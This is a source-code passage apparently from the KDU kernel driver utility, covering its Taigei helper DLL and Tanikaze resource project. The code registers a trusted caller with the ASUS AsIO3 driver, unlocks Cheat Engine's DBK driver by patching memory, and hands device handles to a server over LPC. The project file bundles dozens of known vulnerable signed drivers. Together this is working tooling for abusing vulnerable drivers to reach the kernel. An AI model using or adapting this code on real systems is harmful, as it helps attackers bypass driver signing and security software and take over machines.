    ntStatus = NtQueryInformationProcess(NtCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &dummyValue);

    if (NT_SUCCESS(ntStatus)) {

        parentPID = PtrToUlong((PVOID)pbi.InheritedFromUniqueProcessId);

        RtlInitUnicodeString(&deviceName, L"\\Device\\Asusgio3");
        InitializeObjectAttributes(&objectAttributes, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        ntStatus = NtCreateFile(&deviceHandle,
            GENERIC_READ | GENERIC_WRITE,
            &objectAttributes,
            &ioStatusBlock,
            NULL,
            0,
            0,
            FILE_OPEN,
            0,
            NULL,
            0);

        if (NT_SUCCESS(ntStatus)) {

            dummyValue = 0;

            ntStatus = NtDeviceIoControlFile(deviceHandle,
                NULL,
                NULL,
                NULL,
                &ioStatusBlock,
                IOCTL_ASUSIO_REGISTER_TRUSTED_CALLER,
                &parentPID,
                sizeof(parentPID),
                &dummyValue,
                sizeof(dummyValue));

            if (NT_SUCCESS(ntStatus)) {

                liTimeOut.QuadPart = UInt32x32To64(3000, 10000);
                liTimeOut.QuadPart *= -1;

                //
                // Infinite loop.
                //
                while (TRUE) {

                    NtDelayExecution(0, (PLARGE_INTEGER)&liTimeOut);

                }
            }
        }

    }
}

#define EXPORT comment(linker, "/EXPORT:" __FUNCTION__ "=" __FUNCDNAME__)

BOOL WINAPI UnlockAsIO(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(lpvReserved);

#define EXPORT
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        RegisterTrustedCallerForAsIO();
    }

    return TRUE;
}

```

`Source/Taigei/asio.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       ASIO.H
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  ASUS hack-o-rama prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define FILE_DEVICE_ASUSIO          (DWORD)0x0000A040

#define ASUSIO3_REGISTER_FUNCID     (DWORD)0x924

#define IOCTL_ASUSIO_REGISTER_TRUSTED_CALLER     \
    CTL_CODE(FILE_DEVICE_ASUSIO, ASUSIO3_REGISTER_FUNCID, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0xA040A490

VOID RegisterTrustedCallerForAsIO();

```

`Source/Taigei/export.def`:

```def
EXPORTS
SB_SMS_ReadByteEx     = StubFunc
SB_SMS_ReadWordEx     = StubFunc
SB_SMS_ReadBlockEx    = StubFunc
SB_SMS_WriteByteEx    = StubFunc
SB_SMS_WriteWordEx    = StubFunc
SB_SMS_WriteBlockEx   = StubFunc
SB_SMS_GetCtrlCountEx = StubFunc
SB_SMS_QuickCommandEx = StubFunc
RegisterForProvider = UnlockAsIO
RegisterForProvider2 = ExecutableMain

```

`Source/Taigei/global.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       GLOBAL.H
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  Common include header file for Taigei.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#if defined(_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#pragma warning(disable: 4005)

#include <Windows.h>
#include <ntstatus.h>
#include "../Shared/ntos/ntos.h"

#if defined(__cplusplus)
extern "C" {
#endif

#include "../Shared/minirtl/minirtl.h"
#include "../Shared/minirtl/rtltypes.h"

#ifdef __cplusplus
}
#endif

#include "ipc.h"
#include "asio.h"

```

`Source/Taigei/ipc.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2026
*
*  TITLE:       IPC.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Inter-process communication.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#define IPC_GET_HANDLE 0x1337
#define IPC_MAX_RETRY_COUNT 150

NTSTATUS IpcConnectToPort(
    _In_ LPCWSTR PortName,
    _Out_ PHANDLE PortHandle
)
{
    NTSTATUS ntStatus;
    HANDLE portHandle = NULL;
    SECURITY_QUALITY_OF_SERVICE securityQos;
    UNICODE_STRING portName;
    ULONG retryCount = 0;

    securityQos.Length = sizeof(securityQos);
    securityQos.ImpersonationLevel = SecurityImpersonation;
    securityQos.EffectiveOnly = FALSE;
    securityQos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
    RtlInitUnicodeString(&portName, PortName);

    do {

        ntStatus = NtConnectPort(&portHandle,
            &portName,
            &securityQos,
            NULL, NULL, NULL, NULL, NULL);

        if (NT_SUCCESS(ntStatus))
            break;

        Sleep(200);
        retryCount++;

    } while (retryCount < IPC_MAX_RETRY_COUNT);  // ~30 seconds max

    *PortHandle = portHandle;

    return ntStatus;
}

void IpcpSetMessageSize(
    _In_ PPORT_MESSAGE64 Message,
    _In_ ULONG Size
)
{
    Message->u1.s1.TotalLength = (CSHORT)(Size + sizeof(PORT_MESSAGE64));
    Message->u1.s1.DataLength = (CSHORT)Size;
}

NTSTATUS IpcSendReply(
    _In_ HANDLE PortHandle,
    _In_ ULONG Function,
    _In_ ULONG64 Data,
    _In_ ULONG64 ReturnedLength,
    _In_ NTSTATUS Status
)
{
    KDU_LPC_MESSAGE rxMsg, txMsg;

    KDU_MSG* pMsg;

    RtlSecureZeroMemory(&txMsg, sizeof(txMsg));
    IpcpSetMessageSize((PPORT_MESSAGE64)&txMsg.Header, sizeof(KDU_MSG));

    RtlSecureZeroMemory(&rxMsg, sizeof(rxMsg));
    IpcpSetMessageSize((PPORT_MESSAGE64)&rxMsg.Header, sizeof(KDU_MSG));

    pMsg = (KDU_MSG*)&txMsg.Data[0];
    pMsg->Function = Function;
    pMsg->Data = Data;
    pMsg->Status = Status;
    pMsg->ReturnedLength = ReturnedLength;

    return NtRequestWaitReplyPort(PortHandle,
        (PPORT_MESSAGE)&txMsg.Header,
        (PPORT_MESSAGE)&rxMsg.Header);
}

VOID IpcSendHandleToServer(
    _In_ HANDLE ProcessHandle
)
{
    HANDLE portHandle = NULL;
    NTSTATUS ntStatus;

    ntStatus = IpcConnectToPort(KDU_PORT_NAME, &portHandle);
    if (NT_SUCCESS(ntStatus)) {

        ntStatus = IpcSendReply(portHandle,
            IPC_GET_HANDLE,
            (ULONG64)ProcessHandle,
            sizeof(ProcessHandle),
            STATUS_SECRET_TOO_LONG);

        NtClose(portHandle);
    }

}

```

`Source/Taigei/ipc.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       IPC.H
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  Inter-process communication prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define KDU_PORT_NAME L"\\KduPort"

typedef struct _KDU_LPC_MESSAGE {
    PORT_MESSAGE64 Header;
    BYTE Data[128];
} KDU_LPC_MESSAGE, * PKDU_LPC_MESSAGE;

typedef struct _KDU_MSG {
    ULONG Function;
    NTSTATUS Status;
    ULONG64 Data;
    ULONG64 ReturnedLength;
} KDU_MSG, * PKDU_MSG;

VOID IpcSendHandleToServer(
    _In_ HANDLE ProcessHandle);

```

`Source/Taigei/main.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       MAIN.CPP
*
*  VERSION:     1.21
*
*  DATE:        10 June 2023
*
*  Taigei helper dll (part of KDU project).
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* StubFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI StubFunc(
    VOID
)
{

}

#define ZODIACON_KOBJEXP L"\\Device\\KObjExp"
#define ZODIACON_KREGEXP L"\\Device\\KRegExp"

/*
* ExecutableMain
*
* Purpose:
*
* Entry point for exe mode.
*
*/
int ExecutableMain()
{
#define EXPORT

    LPWSTR* lpszArgList;
    LPWSTR lpTargetDevice;
    ULONG ulKey = 0;
    INT nArgs = 0;

    lpszArgList = CommandLineToArgvW(GetCommandLineW(), &nArgs);
    if (lpszArgList) {

        if (nArgs > 0) {

            ulKey = _strtoul(lpszArgList[0]);

            switch (ulKey) {
            case 1:
                lpTargetDevice = (LPWSTR)ZODIACON_KREGEXP;
                break;
            case 0:
            default:
                lpTargetDevice = (LPWSTR)ZODIACON_KOBJEXP;
                break;
            }

            HANDLE deviceHandle;
            NTSTATUS ntStatus;
            UNICODE_STRING deviceName;
            IO_STATUS_BLOCK ioStatusBlock;
            OBJECT_ATTRIBUTES objectAttributes;
            LARGE_INTEGER liTimeOut;

            RtlInitUnicodeString(&deviceName, lpTargetDevice);
            InitializeObjectAttributes(&objectAttributes, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

            ntStatus = NtCreateFile(&deviceHandle,
                GENERIC_READ | GENERIC_WRITE,
                &objectAttributes,
                &ioStatusBlock,
                NULL,
                0,
                0,
                FILE_OPEN,
                0,
                NULL,
                0);

            if (NT_SUCCESS(ntStatus)) {

                IpcSendHandleToServer(deviceHandle);

                liTimeOut.QuadPart = UInt32x32To64(3000, 10000);
                liTimeOut.QuadPart *= -1;

                //
                // Infinite loop.
                //
                while (TRUE) {
                    NtDelayExecution(0, (PLARGE_INTEGER)&liTimeOut);
                }

                ///
                // Never here.
                //
            }

        }

        LocalFree((HLOCAL)lpszArgList);
    }

    ExitProcess(0);
}

#ifdef _WIN64

/*
* DllMain
*
* Purpose:
*
* Dummy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hinstDLL);

    return TRUE;
}

#else

#define TEXT_SECTION ".text"
#define TEXT_SECTION_LENGTH sizeof(TEXT_SECTION)
#define TARGET_IMAGE_BASE 0x00400000
#define TARGET_LINK TEXT("\\\\.\\CEDRIVER73")

PVOID LoadExecutableRaw()
{
    WCHAR szFileName[MAX_PATH * 2];

    DWORD cch = GetModuleFileName(NULL, (LPWSTR)&szFileName, MAX_PATH);
    if (cch == 0 || cch >= MAX_PATH)
        return NULL;

    HANDLE hFile = CreateFile(szFileName,
        GENERIC_READ,
        FILE_SHARE_VALID_FLAGS,
        NULL, OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    LARGE_INTEGER fs;
    GetFileSizeEx(hFile, &fs);

    PVOID lpBuffer = (PVOID)LocalAlloc(LPTR, (SIZE_T)fs.LowPart);
    if (lpBuffer == NULL) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesIO;
    if (!ReadFile(hFile, lpBuffer, fs.LowPart, &bytesIO, NULL)) {
        LocalFree((HLOCAL)lpBuffer);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);

    return lpBuffer;
}

VOID UnlockCheatEngineDriver(
    _In_ PVOID ImageBase
)
{
    PVOID lpFileBuffer = LoadExecutableRaw();
    if (lpFileBuffer == NULL) {
        return;
    }

    PIMAGE_NT_HEADERS ntHeaders = RtlImageNtHeader(ImageBase);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(ntHeaders);
    BOOLEAN bReady = FALSE;

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, pSection++) {

        if (_strncmpi_a((CHAR*)pSection->Name, TEXT_SECTION, TEXT_SECTION_LENGTH) == 0) {

            PCHAR targetAddress = RtlOffsetToPointer(TARGET_IMAGE_BASE, pSection->VirtualAddress);
            PCHAR rawAddress = RtlOffsetToPointer(lpFileBuffer, pSection->PointerToRawData);
            ULONG size = pSection->SizeOfRawData;

            DWORD oldProtect = 0;
            if (VirtualProtect(targetAddress, size, PAGE_READWRITE, &oldProtect)) {
                RtlCopyMemory(targetAddress, rawAddress, size);
                VirtualProtect(targetAddress, size, oldProtect, &oldProtect);
                bReady = TRUE;
            }

            break;
        }

    }

    if (bReady) {

        HANDLE driverHandle = CreateFile(TARGET_LINK,
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0, NULL);

        if (driverHandle != INVALID_HANDLE_VALUE) {

            IpcSendHandleToServer(driverHandle);

            while (TRUE) {
                Sleep(1000);
            }
        }

    }

}

#pragma comment(linker, "/ENTRY:DllMainUnlockDBK")

/*
* DllMainUnlockDBK
*
* Purpose:
*
* Entry point invoking Cheat Engine's provider unlocking procedure.
* Note: target is always x86-32, so this dll will always be 32bit.
*
*/
BOOL WINAPI DllMainUnlockDBK(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        UnlockCheatEngineDriver(GetModuleHandle(NULL));
    }

    return TRUE;
}

#endif

```

`Source/Tanikaze/Tanikaze.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{072f189a-cea9-4ca8-a0fa-1257a7524a8e}</ProjectGuid>
    <RootNamespace>Tanikaze</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <TargetName>drv64</TargetName>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <TargetName>drv64</TargetName>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TANIKAZE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TANIKAZE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TANIKAZE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir);$(SolutionDir)\Shared;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <LinkTimeCodeGeneration>Default</LinkTimeCodeGeneration>
      <ModuleDefinitionFile>export.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <SDLCheck>false</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;TANIKAZE_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir);$(SolutionDir)\Shared;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <ExceptionHandling>false</ExceptionHandling>
      <Optimization>MinSpace</Optimization>
      <StringPooling>true</StringPooling>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <SetChecksum>true</SetChecksum>
      <MinimumRequiredVersion>
      </MinimumRequiredVersion>
      <ModuleDefinitionFile>export.def</ModuleDefinitionFile>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <NoEntryPoint>true</NoEntryPoint>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ResourceCompile Include="resource.rc" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\Shared\consts.h" />
    <ClInclude Include="..\Shared\kdubase.h" />
    <ClInclude Include="tanikaze.h" />
    <ClInclude Include="resource.h" />
  </ItemGroup>
  <ItemGroup>
    <None Include="data\AsusCertService.bin" />
    <None Include="data\dbutilcat.bin" />
    <None Include="data\dbutilinf.bin" />
    <None Include="data\KMUEXE.bin" />
    <None Include="data\KMUSIG.bin" />
    <None Include="data\NeacSafe64Cat.bin" />
    <None Include="drv\ALSysIO64.bin" />
    <None Include="drv\AMDRyzenMasterDriver.bin" />
    <None Include="drv\amsdk.bin" />
    <None Include="drv\AODDriver215.bin" />
    <None Include="drv\AppShopDrv103.bin" />
    <None Include="drv\asio2.bin" />
    <None Include="drv\AsIO3.bin" />
    <None Include="drv\AsrDrv106.bin" />
    <None Include="drv\AsrDrv107.bin" />
    <None Include="drv\AsrDrv107n.bin" />
    <None Include="drv\ATSZIO64.bin" />
    <None Include="drv\AxtuDrv.bin" />
    <None Include="drv\dbk64.bin" />
    <None Include="drv\DbUtil2_3.bin" />
    <None Include="drv\dbutildrv2.bin" />
    <None Include="drv\DirectIo64.bin" />
    <None Include="drv\DirectIo64_2.bin" />
    <None Include="drv\echo_driver.bin" />
    <None Include="drv\eleetx1.bin" />
    <None Include="drv\ene2.bin" />
    <None Include="drv\eneio64.bin" />
    <None Include="drv\enetechio64.bin" />
    <None Include="drv\etdsupp.bin" />
    <None Include="drv\gdrv.bin" />
    <None Include="drv\glckio2.bin" />
    <None Include="drv\gmerdrv.bin" />
    <None Include="drv\heavenluo.bin" />
    <None Include="drv\HW64.bin" />
    <None Include="drv\HwRwDrv.x64.bin" />
    <None Include="drv\inpoutx64.bin" />
    <None Include="drv\iQVM64.bin" />
    <None Include="drv\irec.bin" />
    <None Include="drv\KExplore.bin" />
    <None Include="drv\KObjExp.bin" />
    <None Include="drv\kprocesshacker.bin" />
    <None Include="drv\KRegExp.bin" />
    <None Include="drv\LDD.bin" />
    <None Include="drv\lha.bin" />
    <None Include="drv\mimidrv.bin" />
    <None Include="drv\mktoolsx64.bin" />
    <None Include="drv\msio64.bin" />
    <None Include="drv\NeacSafe64.bin" />
    <None Include="drv\nvoclock.bin" />
    <None Include="drv\pcdsrvc_x64.bin" />
    <None Include="drv\PdFwKrnl.bin" />
    <None Include="drv\PhyDMACC.bin" />
    <None Include="drv\phymemx64.bin" />
    <None Include="drv\phymem_panda.bin" />
    <None Include="drv\physmem.bin" />
    <None Include="drv\pmxdrv64.bin" />
    <None Include="drv\procexp.bin" />
    <None Include="drv\procexp1627.bin" />
    <None Include="drv\procexp1702.bin" />
    <None Include="drv\RTCore64.bin" />
    <None Include="drv\rtkio64.bin" />
    <None Include="drv\rzpnk.bin" />
    <None Include="drv\SysDrv3S.bin" />
    <None Include="drv\ThrottleStop.bin" />
    <None Include="drv\TPwSav.bin" />
    <None Include="drv\WinRing0x64.bin" />
    <None Include="drv\wnBios64.bin" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Source/Tanikaze/Tanikaze.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="resource.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="tanikaze.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\consts.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\kdubase.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <None Include="drv\iQVM64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\procexp.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\RTCore64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\gdrv.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\ATSZIO64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\msio64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\glckio2.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\eneio64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\WinRing0x64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\enetechio64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\phymemx64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\rtkio64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\ene2.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\lha.bin">
